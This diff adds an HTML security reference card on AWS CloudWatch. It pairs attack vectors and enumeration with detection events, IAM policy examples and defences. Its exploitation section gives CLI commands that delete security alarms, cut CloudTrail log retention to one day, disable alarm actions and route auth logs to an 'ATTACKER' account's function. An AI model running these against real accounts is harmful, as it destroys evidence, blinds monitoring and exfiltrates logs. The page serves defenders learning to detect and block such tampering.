@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AWS CloudWatch Security | AWS Security Cards</title>
+<meta name="description" content="CloudWatch is AWS's monitoring service collecting logs, metrics, and events from all services. Attackers target CloudWatch to disable detection, tamper with evidence, and extract sensitive information from logs.">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+    background: #0a0e1a;
+    color: #e2e8f0;
+    line-height: 1.6;
+    padding: 2rem;
+    max-width: 1200px;
+    margin: 0 auto;
+  }
+  a { color: #22d3ee; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+
+  /* Card Image */
+  .card-image {
+    border-radius: 1rem;
+    overflow: hidden;
+    margin-bottom: 2rem;
+    border: 1px solid rgba(255,255,255,0.1);
+  }
+  .card-image img {
+    width: 100%;
+    height: auto;
+    display: block;
+  }
+
+  /* Header */
+  .header {
+    position: relative;
+    overflow: hidden;
+    border-radius: 1rem;
+    background: linear-gradient(135deg, #06b6d415, #0a0e1a, #0ea5e915);
+    border: 1px solid #06b6d44d;
+    padding: 2.5rem;
+    margin-bottom: 2rem;
+  }
+  .header::before {
+    content: '';
+    position: absolute;
+    top: 0; right: 0;
+    width: 24rem; height: 24rem;
+    background: #06b6d40d;
+    border-radius: 50%;
+    filter: blur(3rem);
+  }
+  .header-content { position: relative; display: flex; align-items: flex-start; gap: 1.5rem; }
+  .header-icon { width: 64px; height: 64px; flex-shrink: 0; }
+  .header-icon img { width: 100%; height: 100%; }
+  .header-title { font-size: 1.875rem; font-weight: 700; color: #fff; }
+  .header-badge {
+    display: inline-block;
+    padding: 0.25rem 0.75rem;
+    background: #06b6d433;
+    color: #06b6d4;
+    font-size: 0.8rem;
+    font-weight: 600;
+    border-radius: 999px;
+    border: 1px solid #06b6d44d;
+    margin-left: 0.75rem;
+    vertical-align: middle;
+  }
+  .header-desc { color: #94a3b8; max-width: 42rem; margin-top: 0.5rem; }
+
+  /* Stats */
+  .stats-row { display: grid; grid-template-columns: repeat(4, 1fr); gap: 1rem; margin-bottom: 2rem; }
+  .stat-card {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1rem;
+    text-align: center;
+  }
+  .stat-value { font-size: 1.5rem; font-weight: 700; }
+  .stat-label { font-size: 0.8rem; color: #94a3b8; }
+
+  /* Sections */
+  .section {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.75rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1.5rem;
+    margin-bottom: 1.5rem;
+  }
+  .section h2 {
+    font-size: 1.25rem;
+    font-weight: 700;
+    color: #fff;
+    margin-bottom: 1rem;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+  }
+
+  /* Overview */
+  .overview-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .overview-grid h4 { font-size: 0.9rem; font-weight: 600; margin-bottom: 0.5rem; }
+  .overview-grid p { font-size: 0.875rem; color: #94a3b8; margin-bottom: 0.75rem; }
+  .attack-note {
+    background: rgba(0,0,0,0.3);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 0.75rem;
+    font-size: 0.875rem;
+    color: #cbd5e1;
+  }
+
+  /* Risk Gauge */
+  .risk-gauge { display: flex; align-items: center; gap: 2rem; }
+  .risk-bar-container { flex: 1; }
+  .risk-bar {
+    height: 1rem;
+    background: #0f172a;
+    border-radius: 999px;
+    overflow: hidden;
+  }
+  .risk-bar-fill {
+    height: 100%;
+    border-radius: 999px;
+    background: linear-gradient(90deg, #eab308, #f97316, #ef4444);
+  }
+  .risk-labels { display: flex; justify-content: space-between; font-size: 0.8rem; color: #94a3b8; margin-top: 0.5rem; }
+  .risk-score { text-align: center; }
+  .risk-score-value { font-size: 2.5rem; font-weight: 700; color: #fb923c; }
+  .risk-score-label { font-size: 0.8rem; color: #94a3b8; }
+  .risk-desc { margin-top: 1rem; font-size: 0.875rem; color: #94a3b8; }
+
+  /* Panels Grid */
+  .panels-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.5rem; margin-bottom: 1.5rem; }
+  @media (max-width: 1024px) { .panels-grid { grid-template-columns: repeat(2, 1fr); } }
+  @media (max-width: 640px) { .panels-grid, .stats-row, .overview-grid { grid-template-columns: 1fr; } }
+  .panel {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.75rem;
+    border: 1px solid;
+    padding: 1.5rem;
+  }
+  .panel h3 { font-size: 1.1rem; font-weight: 700; margin-bottom: 1rem; display: flex; align-items: center; gap: 0.5rem; }
+  .panel h4 { font-size: 0.85rem; font-weight: 600; margin-bottom: 0.5rem; margin-top: 1rem; }
+  .panel ul { list-style: none; padding: 0; }
+  .panel li {
+    font-size: 0.85rem;
+    color: #cbd5e1;
+    padding: 0.15rem 0;
+    display: flex;
+    align-items: flex-start;
+    gap: 0.5rem;
+  }
+  .bullet { margin-top: 0.15rem; }
+  .note {
+    margin-top: 1rem;
+    padding: 0.75rem;
+    border-radius: 0.5rem;
+    font-size: 0.85rem;
+  }
+
+  /* Commands */
+  .cmd-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .cmd-block { margin-top: 0.75rem; }
+  .cmd-title { font-size: 0.8rem; color: #94a3b8; margin-bottom: 0.25rem; }
+  pre {
+    background: rgba(0,0,0,0.5);
+    border-radius: 0.5rem;
+    padding: 0.75rem;
+    font-size: 0.8rem;
+    color: #4ade80;
+    overflow-x: auto;
+    border: 1px solid rgba(255,255,255,0.06);
+    white-space: pre-wrap;
+    word-break: break-all;
+    font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', monospace;
+  }
+
+  /* Policies */
+  .policy-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .policy-card {
+    border-radius: 0.5rem;
+    border: 1px solid;
+    padding: 1rem;
+  }
+  .policy-header { display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.75rem; font-size: 0.9rem; }
+  .policy-card pre { margin-bottom: 0.75rem; color: #cbd5e1; }
+  .policy-desc { font-size: 0.8rem; color: #94a3b8; }
+
+  /* Defenses */
+  .defense-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .defense-card {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1rem;
+  }
+  .defense-card:hover { border-color: #22d3ee4d; }
+  .defense-header { display: flex; align-items: flex-start; gap: 0.75rem; }
+  .defense-icon { font-size: 1.5rem; }
+  .defense-card h4 { font-size: 0.9rem; font-weight: 600; color: #fff; margin-bottom: 0.25rem; }
+  .defense-card p { font-size: 0.85rem; color: #94a3b8; margin-bottom: 0.5rem; }
+  .defense-card pre { color: #22d3ee; }
+
+  /* Footer */
+  .footer { text-align: center; padding: 1.5rem 0; font-size: 0.8rem; color: #64748b; }
+  .footer a { color: #22d3ee; }
+
+  /* Prevent ugly page-break splits */
+  .card-image,
+  .header,
+  .stat-card,
+  .stats-row,
+  .section,
+  .panel,
+  .cmd-block,
+  .policy-card,
+  .defense-card,
+  .attack-note,
+  .overview-grid > div,
+  .risk-gauge,
+  .note {
+    break-inside: avoid;
+    page-break-inside: avoid;
+  }
+  .section,
+  .panels-grid,
+  .card-image,
+  .header {
+    break-before: auto;
+    page-break-before: auto;
+  }
+  /* Keep headings with their content */
+  h2, h3, h4 {
+    break-after: avoid;
+    page-break-after: avoid;
+  }
+
+  @media print {
+    body { background: #0a0e1a; -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+    /* Switch panels to 2-col for better page flow */
+    .panels-grid { grid-template-columns: repeat(2, 1fr); }
+    /* Switch commands and policies to single column to avoid splits */
+    .cmd-grid { grid-template-columns: 1fr; }
+    .policy-grid { grid-template-columns: 1fr; }
+    .defense-grid { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<!-- Card Image -->
+<div class="card-image">
+  <img src="../images/cloudwatch-card.webp" alt="AWS CloudWatch Security" />
+</div>
+
+<!-- Header -->
+<div class="header">
+  <div class="header-content">
+    <div class="header-icon"><img src="../icons/cloudwatch.svg" alt="AWS CloudWatch Security" /></div>
+    <div>
+      <div>
+        <span class="header-title">AWS CloudWatch Security</span>
+        <span class="header-badge">MONITORING</span>
+      </div>
+      <p class="header-desc">CloudWatch is AWS's monitoring service collecting logs, metrics, and events from all services. Attackers target CloudWatch to disable detection, tamper with evidence, and extract sensitive information from logs.</p>
+    </div>
+  </div>
+</div>
+
+<!-- Stats -->
+<div class="stats-row">
+        <div class="stat-card">
+          <div class="stat-value" style="color: #f87171;">HIGH</div>
+          <div class="stat-label">Detection Evasion Risk</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #4ade80;">100+</div>
+          <div class="stat-label">Services Monitored</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #60a5fa;">PB+</div>
+          <div class="stat-label">Log Data Volume</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #c084fc;">Real-time</div>
+          <div class="stat-label">Alert Capability</div>
+        </div></div>
+
+<!-- Overview -->
+<div class="section"><h2><span style="color:#06b6d4;">&#x1F4CB;</span> Service Overview</h2><div class="overview-grid">
+        <div>
+          <h4 style="color: #06b6d4;">Logs &amp; Metrics</h4>
+          <p>CloudWatch Logs collects log data from Lambda, ECS, EC2, API Gateway, and custom sources. Metric filters transform log patterns into numeric metrics. CloudWatch Insights enables SQL-like queries across log groups for analysis.</p>
+          <div class="attack-note"><span style="color:#06b6d4;">Attack note:</span> Logs frequently contain leaked credentials, API keys, database connection strings, and internal URLs</div>
+        </div>
+        <div>
+          <h4 style="color: #06b6d4;">Alarms &amp; Dashboards</h4>
+          <p>Alarms trigger SNS notifications and auto-scaling actions based on metric thresholds. Composite alarms combine multiple alarms with AND/OR logic. Dashboards visualize metrics and can be shared publicly if misconfigured.</p>
+          <div class="attack-note"><span style="color:#06b6d4;">Attack note:</span> Deleting or modifying alarms before an attack eliminates the primary detection mechanism for most organizations</div>
+        </div></div></div>
+
+<!-- Risk Assessment -->
+
+<div class="section">
+  <h2>Security Risk Assessment</h2>
+  <div class="risk-gauge">
+    <div class="risk-bar-container">
+      <div class="risk-bar">
+        <div class="risk-bar-fill" style="width: 75%;"></div>
+      </div>
+      <div class="risk-labels"><span>Low</span><span>Medium</span><span>High</span><span>Critical</span></div>
+    </div>
+    <div class="risk-score">
+      <div class="risk-score-value">7.5</div>
+      <div class="risk-score-label">Risk Score</div>
+    </div>
+  </div>
+  <p class="risk-desc">CloudWatch is the primary detection mechanism for many organizations. Attackers who can modify alarms, delete logs, or disable monitoring gain significant evasion capabilities.</p>
+</div>
+
+<!-- Main Panels -->
+<div class="panels-grid">
+      <div class="panel" style="border-color: #f8717133;">
+        <h3 style="color: #f87171;">⚔️ Attack Vectors</h3><h4 style="color: #f87171;">Monitoring Attacks</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Alarm deletion/modification</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Log group deletion</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Retention policy reduction</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Metric filter manipulation</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Subscription filter hijacking</li></ul><h4 style="color: #f87171;">Data Mining</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Insights queries for credentials in logs</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Log stream searches for API keys</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Metric data for usage pattern analysis</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Dashboard enumeration for architecture intel</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Cross-account log group access</li></ul></div>
+      <div class="panel" style="border-color: #fb923c33;">
+        <h3 style="color: #fb923c;">⚠️ Misconfigurations</h3><h4 style="color: #fb923c;">Log Group Issues</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> No log retention configured (infinite cost)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Missing KMS encryption on log groups</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Overly permissive log group resource policies</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> No cross-account log backup destination</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Application secrets logged in plaintext</li></ul><h4 style="color: #fb923c;">Alarm Issues</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Alarms without SNS notification actions</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Missing critical metric filters for security</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> No alarm on alarm-modification events</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Composite alarms with OR logic (easily evaded)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Auto-scaling triggers without guard rails</li></ul></div>
+      <div class="panel" style="border-color: #22d3ee33;">
+        <h3 style="color: #22d3ee;">🔍 Enumeration</h3>
+        <div class="cmd-block">
+          <div class="cmd-title">List Log Groups</div>
+          <pre><code>aws logs describe-log-groups</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List Alarms</div>
+          <pre><code>aws cloudwatch describe-alarms</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List Metric Filters</div>
+          <pre><code>aws logs describe-metric-filters \\
+  --log-group-name /aws/lambda/myfunction</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List Dashboards</div>
+          <pre><code>aws cloudwatch list-dashboards</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Get Retention Policies</div>
+          <pre><code>aws logs describe-log-groups \\
+  --query 'logGroups[*].[logGroupName,retentionInDays]'</code></pre>
+        </div></div>
+      <div class="panel" style="border-color: #c084fc33;">
+        <h3 style="color: #c084fc;">📈 Privilege Escalation</h3><h4 style="color: #c084fc;">Log Data Exploitation</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Extract credentials from application logs</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Find API keys in Lambda execution logs</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Discover database connection strings in errors</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Identify internal endpoints from log entries</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Mine session tokens from access logs</li></ul><h4 style="color: #c084fc;">Insights Query Attacks</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Query CloudTrail logs for IAM key usage</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Search for AssumeRole patterns to find targets</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Find error messages revealing infrastructure</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Identify high-privilege operations by principal</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Discover unmonitored API calls</li></ul><div class="note"><strong>Key insight:</strong> CloudWatch Logs Insights can query across 50 log groups simultaneously - one query can expose credentials across all Lambda functions.</div></div>
+      <div class="panel" style="border-color: #facc1533;">
+        <h3 style="color: #facc15;">🔗 Persistence</h3><h4 style="color: #facc15;">Detection Evasion</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Delete security-critical alarms before attack</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Reduce log retention to 1 day (evidence destroyed)</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Modify metric filters to suppress alerts</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Remove SNS actions from existing alarms</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Set alarm state to OK manually</li></ul><h4 style="color: #facc15;">Ongoing Access</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Add subscription filter to exfil logs to attacker</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Create log destination to attacker account</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Inject misleading log entries for cover</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Modify dashboards to hide attack indicators</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Create false positive noise to drown real alerts</li></ul></div>
+      <div class="panel" style="border-color: #4ade8033;">
+        <h3 style="color: #4ade80;">🛡️ Detection</h3><h4 style="color: #4ade80;">CloudTrail Events</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> DeleteLogGroup</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> DeleteAlarms</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> PutRetentionPolicy (short retention)</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> DeleteSubscriptionFilter</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> DisableAlarmActions</li></ul><h4 style="color: #4ade80;">Indicators of Compromise</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Alarm deletions from unknown principals</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Retention policy changes to short periods</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> New subscription filters to external destinations</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> SetAlarmState calls (manual override)</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Log group deletions during incident</li></ul></div></div>
+
+<!-- Exploitation -->
+<div class="section"><h2><span style="color:#f87171;">&#x1F4BB;</span> Exploitation Commands</h2><div class="cmd-grid">
+        <div class="cmd-block">
+          <div class="cmd-title">Search Logs for Credentials</div>
+          <pre><code></code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Insights Query - Find API Keys</div>
+          <pre><code></code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Delete Security Alarms</div>
+          <pre><code>aws cloudwatch delete-alarms \\
+  --alarm-names &quot;UnauthorizedAPICalls&quot; \\
+  &quot;RootAccountUsage&quot; &quot;IAMPolicyChanges&quot;</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Reduce Retention (Destroy Evidence)</div>
+          <pre><code>aws logs put-retention-policy \\
+  --log-group-name /aws/cloudtrail/logs \\
+  --retention-in-days 1</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Disable Alarm Actions</div>
+          <pre><code>aws cloudwatch disable-alarm-actions \\
+  --alarm-names &quot;SecurityAlarm&quot; &quot;GuardDutyAlert&quot;</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Add Exfil Subscription Filter</div>
+          <pre><code>aws logs put-subscription-filter \\
+  --log-group-name /aws/lambda/auth \\
+  --filter-name exfil \\
+  --filter-pattern &quot;&quot; \\
+  --destination-arn arn:aws:lambda:us-east-1:ATTACKER:function:exfil</code></pre>
+        </div></div></div>
+
+<!-- Policies -->
+<div class="section"><h2><span style="color:#4ade80;">&#x1F4DC;</span> Policy Examples</h2><div class="policy-grid">
+        <div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+          <div class="policy-header">
+            <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
+            <span style="color: #f87171; font-weight: 600;">Dangerous - Full Logs &amp; Alarms Access</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: [&quot;logs:*&quot;, &quot;cloudwatch:*&quot;],
+    &quot;Resource&quot;: &quot;*&quot;
+  }]
+}</code></pre>
+          <p class="policy-desc">Full access enables log tampering, alarm deletion, and evidence destruction</p>
+        </div>
+        <div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Secure - Read-Only Monitoring</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: [
+      &quot;logs:GetLogEvents&quot;,
+      &quot;logs:FilterLogEvents&quot;,
+      &quot;logs:DescribeLogGroups&quot;,
+      &quot;cloudwatch:GetMetricData&quot;,
+      &quot;cloudwatch:DescribeAlarms&quot;
+    ],
+    &quot;Resource&quot;: &quot;*&quot;
+  }]
+}</code></pre>
+          <p class="policy-desc">Read-only access to logs and metrics without modification capability</p>
+        </div>
+        <div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+          <div class="policy-header">
+            <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
+            <span style="color: #f87171; font-weight: 600;">Dangerous - Delete Permissions</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: [
+      &quot;logs:DeleteLogGroup&quot;,
+      &quot;logs:PutRetentionPolicy&quot;,
+      &quot;cloudwatch:DeleteAlarms&quot;
+    ],
+    &quot;Resource&quot;: &quot;*&quot;
+  }]
+}</code></pre>
+          <p class="policy-desc">Destructive permissions enable complete evidence destruction and evasion</p>
+        </div>
+        <div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Secure - Deny Log Destruction</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Deny&quot;,
+    &quot;Action&quot;: [
+      &quot;logs:DeleteLogGroup&quot;,
+      &quot;logs:DeleteLogStream&quot;,
+      &quot;logs:PutRetentionPolicy&quot;,
+      &quot;cloudwatch:DeleteAlarms&quot;,
+      &quot;cloudwatch:DisableAlarmActions&quot;
+    ],
+    &quot;Resource&quot;: &quot;*&quot;,
+    &quot;Condition&quot;: {
+      &quot;StringNotEquals&quot;: {
+        &quot;aws:PrincipalArn&quot;: &quot;arn:aws:iam::*:role/SecurityAdmin&quot;
+      }
+    }
+  }]
+}</code></pre>
+          <p class="policy-desc">SCP-style deny on destructive actions except for security admin role</p>
+        </div></div></div>
+
+<!-- Defenses -->
+<div class="section"><h2><span style="color:#4ade80;">&#x1F6E1;&#xFE0F;</span> Defense Recommendations</h2><div class="defense-grid">
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔄</span>
+            <div>
+              <h4>Cross-Account Log Export</h4>
+              <p>Export logs to a security account that attackers in the source account cannot access.</p>
+              <pre><code>aws logs put-destination \\
+  --destination-name security-backup \\
+  --target-arn arn:aws:kinesis:us-east-1:SECURITY_ACCT:stream/logs \\
+  --role-arn arn:aws:iam::SECURITY_ACCT:role/LogExport</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔐</span>
+            <div>
+              <h4>KMS Encryption</h4>
+              <p>Encrypt log groups with KMS keys that have restricted key policies to prevent unauthorized access.</p>
+              <pre><code>aws logs associate-kms-key \\
+  --log-group-name /aws/cloudtrail/logs \\
+  --kms-key-id arn:aws:kms:us-east-1:*:key/xxx</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔒</span>
+            <div>
+              <h4>SCP - Protect Log Groups</h4>
+              <p>Use SCPs to prevent retention policy changes and log group deletion across all accounts.</p>
+              <pre><code>&quot;Effect&quot;: &quot;Deny&quot;,
+&quot;Action&quot;: [&quot;logs:DeleteLogGroup&quot;,&quot;logs:PutRetentionPolicy&quot;],
+&quot;Resource&quot;: &quot;arn:aws:logs:*:*:log-group:/aws/cloudtrail/*&quot;</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔔</span>
+            <div>
+              <h4>Alarm on Alarm Changes</h4>
+              <p>Create a meta-alarm that triggers when security alarms are modified or deleted.</p>
+              <pre><code>aws cloudwatch put-metric-alarm \\
+  --alarm-name AlarmTamperDetection \\
+  --metric-name DeleteAlarms \\
+  --namespace CloudTrailMetrics \\
+  --threshold 0 --comparison-operator GreaterThanThreshold</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">📋</span>
+            <div>
+              <h4>Log Group Resource Policies</h4>
+              <p>Protect critical log groups with resource-based policies to prevent cross-account tampering.</p>
+              <pre><code>aws logs put-resource-policy \\
+  --policy-name ProtectSecurityLogs \\
+  --policy-document file://log-policy.json</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">💾</span>
+            <div>
+              <h4>S3 Export with Object Lock</h4>
+              <p>Export logs to S3 with object lock for immutable, tamper-proof storage.</p>
+              <pre><code>aws s3api put-object-lock-configuration \\
+  --bucket security-logs \\
+  --object-lock-configuration '{&quot;ObjectLockEnabled&quot;:&quot;Enabled&quot;,
+  &quot;Rule&quot;:{&quot;DefaultRetention&quot;:{&quot;Mode&quot;:&quot;COMPLIANCE&quot;,&quot;Days&quot;:365}}}'</code></pre>
+            </div>
+          </div>
+        </div></div></div>
+
+<!-- Footer -->
+<div class="footer">
+  <p>AWS CloudWatch Security Card</p>
+  <p style="margin-top:0.25rem;">Always obtain proper authorization before testing</p>
+</div>
+
+</body>
+</html>
